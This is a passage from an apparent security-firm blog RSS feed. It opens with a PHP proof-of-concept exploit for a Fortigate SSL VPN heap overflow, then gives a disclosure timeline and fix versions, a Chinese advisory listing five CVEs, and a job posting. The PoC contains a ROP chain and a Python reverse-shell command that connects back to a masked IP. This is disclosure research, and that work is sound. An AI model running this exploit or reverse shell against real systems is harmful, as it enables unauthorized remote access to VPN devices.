    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190807/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;Here we put our php PoC on an HTTP server:&lt;/p&gt;
    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;II&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$low&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$high&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4141414141414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32FC078&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nop_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110FA1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// # start here # pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &apos;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&apos; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;AAAAAAAA&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Fake SSL structure
 The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;

        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;So we set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ROP chain
 The ROP chain here is simple. We slightly move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
      &lt;li&gt;Overflow string
 Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</link>
                <guid>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Fortigate SSL VPN è³‡å®‰é€šå ±</title>
                <description>&lt;h3 id=&quot;å…§å®¹&quot;&gt;å…§å®¹&lt;/h3&gt;

&lt;p&gt;ä¸Šä¸€ç¯‡ SSL VPN ç ”ç©¶ç³»åˆ—æ–‡æˆ‘å€‘é€šå ±äº†åœ¨ &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect ä¸Šçš„ RCE å¼±é»&lt;/a&gt;ï¼Œé€™ä¸€ç¯‡å°‡å…¬é–‹æˆ‘å€‘åœ¨ Fortigate SSL VPN ä¸Šçš„ç ”ç©¶ï¼Œå…±è¨ˆæ‰¾åˆ°ä¸‹åˆ—äº”å€‹å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€éä¸éœ€èªè­‰çš„ä»»æ„è®€æª”å•é¡Œ(CVE-2018-13379)åŠ ä¸Šç®¡ç†ä»‹é¢ä¸Šçš„ heap overflow(CVE-2018-13383)ï¼Œæƒ¡æ„ä½¿ç”¨è€…å¯ç›´æ¥å–å¾— SSL VPN çš„æœ€é«˜æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿç™¼ç¾äº†ä¸€å€‹å®˜æ–¹å¾Œé–€(CVE-2018-13382)ï¼Œå¯ä»¥ä»»æ„ä¿®æ”¹ä½¿ç”¨è€…å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨å›å ± Fortigate å¾Œï¼Œå®˜æ–¹å·²é™¸çºŒä¿®å¾©é€™äº›å¼±é»ï¼Œå»ºè­° Fortigate SSL VPN çš„ç”¨æˆ¶æ›´æ–°è‡³æœ€æ–°ç‰ˆã€‚&lt;/p&gt;

&lt;h3 id=&quot;ç´°ç¯€&quot;&gt;ç´°ç¯€&lt;/h3&gt;

&lt;p&gt;è©³ç´°çš„æŠ€è¡“ç´°ç¯€è«‹åƒé–±æˆ‘å€‘çš„ Advisoryï¼š
&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;é€™ç³»åˆ— VPN ç ”ç©¶ä¹Ÿå¾—åˆ°äº†ä»Šå¹´ BlackHat 2019 Pwnie Awards çš„ &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;pwnie for best server-side bug&lt;/a&gt;ï¼ˆå¹´åº¦æœ€ä½³ä¼ºæœå™¨æ¼æ´ï¼‰ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[å·²çµæŸ] DEVCORE å¾µæ±‚è¡Œæ”¿å°ˆå“¡</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾å³å°‡æ»¿ä¸ƒå¹´äº†ï¼Œéå»æˆ‘å€‘ä¸æ–·åœ°é‘½ç ”é€²éšæ”»æ“ŠæŠ€å·§ï¼Œç‚ºè¨±å¤šå®¢æˆ¶æä¾›é«˜å“è³ªçš„æ»²é€æ¸¬è©¦æœå‹™ï¼Œä¹Ÿæˆç‚ºå®¢æˆ¶æœ€ä¿¡è³´çš„è³‡å®‰ä¼™ä¼´ä¹‹ä¸€ã€‚åœ¨ 2017 å¹´æˆ‘å€‘æ›´æˆç‚ºç¬¬ä¸€å€‹åœ¨å°ç£æ¨å‡ºç´…éšŠæ¼”ç·´æœå‹™çš„æœ¬åœŸå» å•†ï¼Œé€éç„¡æ‰€ä¸ç”¨å…¶æ¥µçš„é§­å®¢æ€ç¶­ï¼Œé™¸çºŒç‚ºé›»å­å•†å‹™ã€æ”¿åºœéƒ¨é–€ã€é‡‘èæ¥­è€…åŸ·è¡Œæœ€çœŸå¯¦ä¸”å…¨é¢çš„æ”»æ“Šæ¼”ç·´ï¼ŒåŒæ™‚ä¹Ÿç´¯ç©äº†è±å¯Œçš„ç¶“é©—èˆ‡æ¡ˆä¾‹ï¼Œæˆç‚ºå°ç£ç´…éšŠæ¼”ç·´å¯¦åŠ›æœ€æ·±åšçš„æœå‹™ä¾›æ‡‰å•†ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ 2015 å¹´æˆ‘å€‘æ›¾ç¶“å…¬é–‹å¾µæ±‚ä¸€ä½è¡Œæ”¿å‡ºç´äººæ‰ï¼Œå¾Œä¾†ç¶“éå±¤å±¤çš„å±¥æ­·å¯©æ ¸ã€ç­†è©¦ã€é¢è©¦ï¼Œçµ‚æ–¼é †åˆ©æ‰¾åˆ°ä¸€ä½ç¶“é©—è±å¯Œä¸”å€¼å¾—ä¿¡è³´çš„ç”Ÿæ´»é§­å®¢ï¼Œæˆç‚ºæˆ‘å€‘æœ€å¼·è€Œæœ‰åŠ›çš„å¾Œå‹¤ä¼™ä¼´ã€‚ä½†æ˜¯éš¨è‘—åœ˜éšŠäººæ•¸å¢é•·ã€æ¥­å‹™è¦æ¨¡å¤§å¹…å¢åŠ ã€äº‹å‹™åˆ†å·¥å°ˆæ¥­åŒ–ï¼Œè¡Œæ”¿éƒ¨é–€çš„çœ¾å¤šå·¥ä½œå·²ç¶“ç„¡æ³•ç”±å–®ä¸€äººåŠ›ç¨è‡ªè² è·ã€‚&lt;/p&gt;

&lt;p&gt;å› æ­¤ä»Šå¹´æˆ‘å€‘å†åº¦å…¬é–‹æ‹›å‹Ÿè¡Œæ”¿äººæ‰ï¼Œå¸Œæœ›èƒ½å¤ æ‰¾åˆ°ä¸€ä½è¡Œæ”¿å°ˆå“¡ï¼Œæ“´å¤§æˆ‘å€‘çš„å¾Œå‹¤èƒ½é‡ï¼Œéå›ºæˆ´å¤«å¯‡çˆ¾çš„åœ˜éšŠä½œæˆ°èƒ½åŠ›ï¼Œè®“æˆ‘å€‘æŒçºŒç‚ºä¼æ¥­æä¾›æœ€å„ªç•°çš„è³‡å®‰æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘éå¸¸æ¸´æœ›æ‚¨çš„åŠ å…¥ï¼Œè‹¥æ‚¨æœ‰æ„æˆç‚ºæˆ´å¤«å¯‡çˆ¾çš„ä¸€å“¡ï¼Œå¯åƒè€ƒä¸‹åˆ—è·ç¼ºç´°ç¯€ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å·¥ä½œå…§å®¹&quot;&gt;å·¥ä½œå…§å®¹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;åº¶å‹™æ€§è¡Œæ”¿å·¥ä½œ 50%
    &lt;ul&gt;
      &lt;li&gt;äººå“¡æ¥å¾…ï¼Œä¾‹å¦‚ï¼šé›»è©±æ¥è½ã€ä¾†è¨ªäººå“¡æ¥å¾…&lt;/li&gt;
      &lt;li&gt;æ–‡ä»¶æ”¶ç™¼ï¼Œä¾‹å¦‚ï¼šéƒµå‹™ä½œæ¥­ã€å¿«éæœå‹™&lt;/li&gt;
      &lt;li&gt;æª”æ¡ˆç®¡ç†ï¼Œä¾‹å¦‚ï¼šåç‰‡æƒæã€åˆç´„æƒæã€ç¯„æœ¬æª”æ¡ˆæ ¼å¼èª¿æ•´&lt;/li&gt;
      &lt;li&gt;è³‡æ–™è’é›†ï¼Œä¾‹å¦‚ï¼šå„é¡å…¬å¸æ¥­å‹™éœ€æ±‚è³‡æ–™æŸ¥æ‰¾&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¸½å‹™å·¥ä½œ 20%
    &lt;ul&gt;
      &lt;li&gt;è¾¦å…¬å®¤å„é¡ç”¨å“æ¡è²·&lt;/li&gt;
      &lt;li&gt;è¾¦å…¬å®¤ç’°å¢ƒç¶­è­·&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¡è³¼å·¥ä½œ 15%
    &lt;ul&gt;
      &lt;li&gt;è¨­å‚™æ¡è³¼ç®¡ç†&lt;/li&gt;
      &lt;li&gt;æœå‹™ä¾›æ‡‰å•†ç®¡ç†&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;äººäº‹å·¥ä½œ 5%
    &lt;ul&gt;
      &lt;li&gt;ä¿éšªäº‹å‹™ï¼Œä¾‹å¦‚ï¼šåœ˜é«”ä¿éšªã€æ—…éŠä¸ä¾¿éšª&lt;/li&gt;
      &lt;li&gt;å·®æ—…è¡Œç¨‹ï¼Œä¾‹å¦‚ï¼šäº¤é€šç¥¨åˆ¸è¨‚è³¼ã€ç°½è­‰è¾¦ç†&lt;/li&gt;
      &lt;li&gt;æ•™è‚²è¨“ç·´å®‰æ’&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…¶ä»–ä¸»ç®¡äº¤è¾¦äº‹é … 10%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ™‚é–“&quot;&gt;å·¥ä½œæ™‚é–“&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œåœ°é»&quot;&gt;å·¥ä½œåœ°é»&lt;/h3&gt;
&lt;p&gt;å°åŒ—å¸‚ä¸­å±±å€å¾©èˆˆåŒ—è·¯ 168 è™Ÿ 10 æ¨“
ï¼ˆæ·é‹å—äº¬å¾©èˆˆç«™ 8 è™Ÿå‡ºå£ï¼Œèµ°è·¯ç´„ 3 åˆ†é˜ï¼‰&lt;/p&gt;

&lt;h3 id=&quot;äººæ ¼ç‰¹è³ªåå¥½&quot;&gt;äººæ ¼ç‰¹è³ªåå¥½&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;ç´°å¿ƒåš´è¬¹ï¼Œèƒ½è€å¿ƒçš„è™•ç†ç¹ç‘£çš„åº¶å‹™å·¥ä½œã€‚&lt;/li&gt;
  &lt;li&gt;ä¸»å‹•ç©æ¥µï¼Œçœ‹åˆ°æˆ‘å€‘æ²’ç™¼ç¾çš„ç´°ç¯€ï¼Œè¶…è¶Šæˆ‘å€‘æ‰€æœŸæœ›çš„åŸºæº–ã€‚&lt;/li&gt;
  &lt;li&gt;æ‡‚å¾—æºé€šå‚¾è½ï¼Œèƒ½åŒç†ä»–äººï¼Œæ‰¾å‡ºå½¼æ­¤å…±è­˜ã€‚&lt;/li&gt;
  &lt;li&gt;æ“…é•·é‚è¼¯æ€è€ƒï¼Œæ‡‚å¾—é€éæ·ºé¡¯æ˜“æ‡‚ä¸”æ¢ç†æ¸…æ™°çš„æ–¹å¼å‚³é”è‡ªå·±çš„æƒ³æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;è‰¯å¥½çš„æ™‚é–“ç®¡ç†èƒ½åŠ›ï¼Œä¾æ“šä»»å‹™çš„å„ªå…ˆé †åºï¼Œæœ‰æ•ˆç‡çš„å®Œæˆæ¯é …äº¤è¾¦ã€‚&lt;/li&gt;
  &lt;li&gt;å‹‡æ–¼æ¥å—æŒ‘æˆ°ä¸”å…·å‚™è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼ŒåŠªåŠ›å…‹æœæœªçŸ¥çš„é›£é¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œæ¢ä»¶è¦æ±‚&quot;&gt;å·¥ä½œæ¢ä»¶è¦æ±‚&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;éœ€æœ‰ä¸‰å¹´ä»¥ä¸Šè¡Œæ”¿ç›¸é—œå·¥ä½œç¶“é©—&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Google Sheets æ“ä½œï¼Œä¸”å…·ç¨ç«‹æ’°å¯«è©¦ç®—è¡¨å…¬å¼çš„èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;ç¿’æ…£ä½¿ç”¨é›²ç«¯æœå‹™ï¼Œå¦‚ï¼šGoogle Drive, Dropbox æˆ–å…¶ä»–&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;åŠ åˆ†æ¢ä»¶&quot;&gt;åŠ åˆ†æ¢ä»¶&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨ä½¿ç”¨éå°ˆæ¡ˆç®¡ç†ç³»çµ±ï¼Œå¦‚ï¼šTrello, Basecamp, Redmine æˆ–å…¶ä»–&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨å°‡æœƒä½¿ç”¨å°ˆæ¡ˆç®¡ç†ç³»çµ±ç®¡ç†å¹³æ—¥ä»»å‹™ã€‚&lt;/font&gt;&lt;/li&gt;
